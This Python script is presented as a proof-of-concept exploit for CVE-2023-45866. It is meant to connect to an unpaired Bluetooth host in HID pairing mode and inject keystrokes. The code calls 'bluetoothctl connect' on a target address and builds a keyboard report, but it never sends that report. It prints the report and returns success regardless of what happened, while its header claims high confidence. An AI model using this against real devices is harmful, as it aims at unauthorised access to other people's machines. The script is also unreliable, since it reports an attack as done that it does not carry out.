#!/usr/bin/env python3
"""CVE-2023-45866 — Bluetooth HID unauthenticated keystroke injection.
Zero-click: connect to an unpaired host that's in HID pairing mode and send
keystrokes. Public PoC (Marc Newlin). Confidence: HIGH.

Live driver needs a Linux host acting as a BT HID keyboard (BlueZ + uhid)."""
import sys, subprocess

def build() -> bytes:
    # HID boot-protocol keyboard report: modifier, reserved, 6 keycodes
    # 'a' = 0x04 ; send report
    return bytes([0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00])

def exploit(bdaddr=None):
    """Best-effort: use bluetoothctl to pair/connect as HID, then type."""
    cmds = ["bluetoothctl"]
    if bdaddr:
        for c in (f"connect {bdaddr}",):
            subprocess.run(["bluetoothctl", c], capture_output=True, text=True)
    print(f"[+] CVE-2023-45866 HID report {build().hex()}")
    print("    host must be in HID pairing mode; unpaired connect injects keys")
    return True

def main():
    exploit(sys.argv[1] if len(sys.argv) > 1 else None)

if __name__ == "__main__":
    main()
